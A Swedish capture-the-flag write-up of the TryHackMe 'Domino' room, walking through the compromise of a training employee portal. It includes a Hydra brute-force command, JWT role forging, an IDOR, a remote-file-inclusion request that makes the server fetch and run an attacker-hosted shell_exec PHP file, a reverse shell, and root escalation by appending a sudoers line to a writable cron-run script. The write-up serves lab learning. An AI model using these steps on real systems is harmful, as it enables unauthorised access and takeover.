# Domino

![Screenshot](img/Pasted%20image%2020260601122701.png)

https://tryhackme.com/room/domino
## Introduction

> The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.

> As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.

> _A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time._

![Screenshot](img/Pasted%20image%2020260601122804.png)
## Recon

Vad säger nmap?

Port 80 och 22 är öppna.

Hur ser hemsidan ut? Så här:

![Screenshot](img/Pasted%20image%2020260601123346.png)

Forgot password leder till `/forgot.php` och Our Team till `/team.php`. I och med att formatet för användarnamnen avslöjas i formuläret blir teams-sidan högst intressant!

![Screenshot](img/Pasted%20image%2020260601123540.png)

Dra igång en Hydra med rockyou direkt? Nja, letar runt lite till först.

Så här ser `/forgot.php` ut:

![Screenshot](img/Pasted%20image%2020260601123701.png)

Kanske kan nollställa lösenord och lista ut vad som händer i bakgrunden?

Så här ser det ut i frontend om jag nollställer för `emma.taylor`, och jag ser tyvärr inget mer intressant i Burp.

![Screenshot](img/Pasted%20image%2020260601123915.png)

En fuzzing av endpoints hittar bland annat:
- /static/app.js
- /support
- /admin
- /backup
### /static/app.js

![Screenshot](img/Pasted%20image%2020260601124800.png)

En perfekt kommentar om att flytta alla secrets innan hemsidan går till produktion :D Här kommer vi alltså åt en krypteringsnyckel som har med en backup config att göra.
### /backup

![Screenshot](img/Pasted%20image%2020260601124600.png)

I README.txt går att läsa:

![Screenshot](img/Pasted%20image%2020260601125012.png)

Nyckeln som vi hittade i `app.js` ska användas för att dekryptera `config.enc`. Kan vi anta i alla fall.

Detta kan göras i terminalen. Först hämtar vi filen med curl:

`curl http://$IP/backup/config.enc -o config.enc`

VIll därefter använda Openssl för att dekryptera filen. Dock måste nyckeln anpassas för att lira med openssl. Dels måste lösenordet göras om till hex, dels måste det till padding på slutet (som det stod i `app.js`)

Nyckeln till hex blir `4e 33 78 75 73 4b 33 79 32 30 32 34 21 21` 

Endast 14 bytes, så två nullbytes på slutet så blir det rätt: `4e 33 78 75 73 4b 33 79 32 30 32 34 21 21 00 00`

Kommandot i openssl blir följande:

```bash
openssl enc -d -aes-128-ecb \
-in config.enc \
-out config.dec \
-K 4e337875734b33793230323421210000
```

I den dekrypterade config-filen fanns en liten JSON-blob:

```json
{
	"app_name":"NexusCorp Portal",
	"version":"2.3.1",
	"deploy_env":"production",
	"system_user":"devops"
}
```

Trevligt! Kan ju komma till nytta senare.
### /api/auth/token.php

En GET request till URL:en redirectar till `index.php`. Kollar i Burp, vad händer om man skickar ett POST request? Utan body blir det samma redirect.

Om vi lägger till hela configen som body?

![Screenshot](img/Pasted%20image%2020260601131138.png)

Inget avslöjande svar från API:et. Behöver kanske en giltig inloggning från en befintlig användare för att få snacka med API:et. Har inte ännu helt brutit ner och förstått innehållet i `app.js` så har inte hela bilden av hur processen är tänkt att gå.

Det känns som att vi behöver en giltig cookie för att få prata med API:et. Och utan att veta hur denna cookie ska se ut blir ett väääldigt longshot att sitta och gissa. Så, jag kan se två möjliga vägar framåt:

- Brute force:a (med Hydra) ett inlogg för att få en giltig token.
- Lista ut hur backend funkar när man återställer lösenord - kanske att de återställs till ett lösenord som följer ett visst mönster som är enkelt att gissa.

Vi har dock inte hittat några filer som avslöjar ur återställningen av lösenord fungerar, så det blir att börja med Hydra. 

Skapade en lista med alla användarnamn. Därefter:

```bash
hydra -L usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt $IP http-post-form \ 
  "/index.php:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 20 -f
```

Som resulterade i:

![Screenshot](img/Pasted%20image%2020260601153858.png)

Efter att ha loggat in fick vi en massa spännande grejer:

![Screenshot](img/Pasted%20image%2020260601154033.png)

Vi har även fått en lite mer redig cookie, så nu borde vi kunna snacka med API:et

![Screenshot](img/Pasted%20image%2020260601154136.png)

Oh yes, efter att ha navigerat till `/api/auth/token.php` fick jag följande info:

```json
{
	"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODAzMjIwMTEsImV4cCI6MTc4MDMyNTYxMX0.aGehUKO0v1PKZJQsDRJlzXyEWg39fVyWAtCnj9fHmUU",
	"expires_in":3600,
	"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"
	}
```

Dags att försöka snacka med `/api/files.php` 

Öppnar Burp, försöker besöka `/api/files.php` men behöver lägga till min api-token. Gör detta med headern `Authorization` och gör ett nytt försök. Då fick jag snacka, men fick följande svar:

![Screenshot](img/Pasted%20image%2020260601154939.png)

Kan vi förfalska vår JWT? Hoppar direkt till jwt.io

Algoritmen som används är HS256 - en symmetrisk variant som som endast använder *en* hemlig nyckel både för signering och verifiering. Kan vi byta roll från user till admin? Låt oss se.

![Screenshot](img/Pasted%20image%2020260601155807.png)

Nice, vi får snacka med API:et. Nu vill den ha en namnparameter, precis så som det stod när vi loggade in med en giltig användare. Vi ska alltså peka mot ett specifikt filnamn.

Lyckades inte peka mot nåt giltigt användarnamn, men tog en snabb titt på "My Profile API". Sarah Johnsons ID är 3, men när jag ändrade ID till 1 upptäckte jag en IDOR-sårbarhet och första flaggan hittades:

![Screenshot](img/Pasted%20image%2020260601160717.png)

När vi ändå hade en giltig JWT som admin testade jag att kika på endpointen `/admin/` och hittade en flagga till!

![Screenshot](img/Pasted%20image%2020260601161607.png)
## /api/files.php

Eftersom fråga tre i uppgiften handlar om att man på nåt vis ska få RCE på servern misstänker jag att meningen till varför det finns ett "fil-API" är för att vi ska kunna peka på filen vi själva planterat för att ge oss just RCE. En teori i alla fall. Det finns ju även en funktion för att öppna tickets - känns som en given väg för att plantera en malicious fil? :)

![Screenshot](img/Pasted%20image%2020260601164416.png)

![Screenshot](img/Pasted%20image%2020260601164425.png)

Hm, vi kan inte ladda upp en fil. Men skriva php rätt in i textfältet?

![Screenshot](img/Pasted%20image%2020260601164643.png)

![Screenshot](img/Pasted%20image%2020260601164659.png)

Hm, ingen chans att klicka upp min ticket igen för att se om min kod exekveras. Möjligen att det går att skriva rätt in i ämnesraden, men tveksamt. Kan jag komma åt min ticket via fil-API:et? Chansade med några namn men det känns långsökt. Och inget som exekverades i ämnesraden heller.

Kanske behöver få åtkomst till admin-användarens dashboard. Tillbaka till jwt.io

Försökte trolla lite med cookien `nexus_session` som vi fick när vi loggade in med en giltig användare, men jwt.io lyckas inte decoda den ordentligt. Det verkar vara nåt custom-bygge.
### Path traversal?

Av frågan på TryHackMe får vi veta att flaggan ska finnas i `/opt/flag3.txt` och för att söka på en fil via `/api/files.php` måste sökvägen vara inom `/var/www/html`. 

Kan ju börja med att se om vi kan läsa ut `index.php`, den borde ju finnas. Och det gjorde den!

![Screenshot](img/Pasted%20image%2020260602120309.png)

Så här ser `files.php` ut:

![Screenshot](img/Pasted%20image%2020260602120551.png)

Två intressanta grejer där - dels att de har lagt in ett skydd för path traversal (vilket jag märkte eftersom jag misslyckades med några försök), dels att de har lagt in en avsiktlig möjlighet att få RCE via `eval()`

Testar en one-liner från revshells.com

![Screenshot](img/Pasted%20image%2020260602121320.png)

Det lirade inte, jag skulle hoppat ner ett steg. Följande attackkedja funkade:
- Skapade en php-fil lokalt som kör `shell_exec` och listar katalogen `/opt` enligt nedan:

```PHP
<?php echo shell_exec("ls -la /opt 2>&1"); ?>
```

- Startar en python-server för att serva min php-fil
- Skickade ett request med namn-parametern `name=http://LOKALT-IP:4444/rfi.php`
- Då listades katalogen i responsen:

![Screenshot](img/Pasted%20image%2020260602123019.png)

Ändrade kommandot till `cat /opt/flag3.txt` istället så fick vi flaggan.

Nu när vi har RCE, varför inte ett reverse shell?

Gjorde samma sak, fast med PHP PentestMonkey lokalt. Fick detta lustiga meddelande:

![Screenshot](img/Pasted%20image%2020260602123408.png)

Testar ett gäng olika payloads. Mitt shell öppnas men kraschar direkt...

![Screenshot](img/Pasted%20image%2020260602124449.png)

Sen föll poletten ner!

I mina tidigare försök hade jag bara servat filen från min maskin samtidigt som jag väntade på en inkommande anslutning från servern. Jag var ju tvungen att *både* serva filen (på en port) och starta en lyssnare (på en annan port) för att det skulle lira. Så jag återgick till PHP PentestMonkey, startade en python-server och en nc-lyssnare:

![Screenshot](img/Pasted%20image%2020260602150407.png)

Boom, där var shellet!
## Flagga 4

Nu har jag mitt reverse shell och har uppgraderat det så det är mer stabilt. Fråga fyra vill att jag hittar flaggan i hemkatalogen för användaren `devops`. Men dit har `www-data` ingen behörighet...

Efter lite sökningar på filsystemet hittade vi `config.php` som innehöll lite götta:

![Screenshot](img/Pasted%20image%2020260602152401.png)

Ta en titt i databasen?

`mysql -u app_user -p -D nexusdb`

Hm, kommer kanske inte hitta nåt mega-fett här:

![Screenshot](img/Pasted%20image%2020260602155222.png)

Samma gamla skåpmat jag hittat tidigare.

Men - använder `devops` samma lösenord för databasen som för sitt inlogg? Svaret är: ja.

![Screenshot](img/Pasted%20image%2020260602155706.png)

En snabb titt i hemkatalogen så var fjärde flaggan i hamn!
## Femte elementet. Eller flaggan.

Den sårbara servern kraschade så jag tappade mitt shell. Men nu vet jag ju vad `devops` använder för lösenord så det är ju bara att ssh:a in och ta vid därifrån för att eskalera till root.

Jag söker frenetiskt på filsystemet utan att hitta nåt spännande - får inte köra sudo, inga spännande cronjob, inga intressanta binärer med SUID-biten satt... Det enda jag hittar är ett gäng grejer i `/opt` som både ägs av root och är skrivbara.

![Screenshot](img/Pasted%20image%2020260602203240.png)

I katalogen `monitoring` finns scriptet `health_report.sh` som ser ut så här:

![Screenshot](img/Pasted%20image%2020260602220404.png)

Inte nog med det - det ägs av `root` och tillhör gruppen `devops`, bingo! Lade till en liten rad bara för att testa:

![Screenshot](img/Pasted%20image%2020260602220958.png)

Trodde att jag ägde när jag testade det här :D

![Screenshot](img/Pasted%20image%2020260602221734.png)

Men permission denied...

![Screenshot](img/Pasted%20image%2020260602221759.png)

`bash -c 'echo "$(</root/flag.txt)"'` funkade inte heller.

Om scriptet hade körts som root via ett cronjob eller systemd-timers hade det varit en småsak, men det gör ju inte det...

Vid en närmare titt så ser jag att `health_report.sh` skriver en loggfil till `/var/log/nexus_health.log`. Den filen har jag tittat i ett par gånger, men nu lägger jag märke till de faktiska tidsstämplarna - de är väldigt frekventa.

Genom att köra `tail -f /var/log/nexus_health.log` kan jag se loggfilen uppdateras i realtid - här är min ingång till root.

![Screenshot](img/Pasted%20image%2020260603105908.png)

![Screenshot](img/Pasted%20image%2020260603105918.png)

Varje minut. 

Efter mycket om och men hittade jag den här trevliga sidan på [geeksforgeeks](https://geeksforgeeks.org/linux-unix/shell-script-to-give-root-privileges-to-a-user). Jag tänkte att variant 4 skulle vara nåt för mig.

Lade till `echo "devops ALL=(ALL) ALL" >> /etc/sudoers` i slutet av `health_report.sh`. När scriptet sedan hade körts kollade jag mina sudo-behörigheter med `sudo -l`. Slutligen `sudo su root` och navigera till `/root` för att hämta hem flaggan.

![Screenshot](img/Screenshot%20from%202026-06-03%2011-31-43.png)

Wow vilken resa. Och vilken wall of text. Happy hacking!